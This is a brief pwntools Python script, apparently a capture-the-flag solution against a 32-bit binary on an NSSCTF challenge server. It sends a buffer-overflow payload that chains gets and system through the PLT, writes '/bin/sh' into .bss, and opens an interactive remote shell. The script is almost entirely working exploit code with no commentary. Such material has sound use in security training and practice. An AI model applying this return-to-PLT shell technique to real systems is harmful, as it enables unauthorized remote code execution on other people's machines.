from pwn import *
context(log_level='debug',arch='x86',terminal=['tmux','splitw','-h'])

# io=process("./pwn")
io=remote("node3.anna.nssctf.cn",28310)
elf=ELF("./pwn")

bss_addr=0x804A028 

# gdb.attach(io)
# pause()

io.recvuntil(b"se?\n")
payload=cyclic(0x2c)+p32(elf.plt[b"gets"])+p32(elf.plt[b"system"])+p32(bss_addr)*2
io.sendline(payload)

io.sendline(b"/bin/sh")


io.interactive()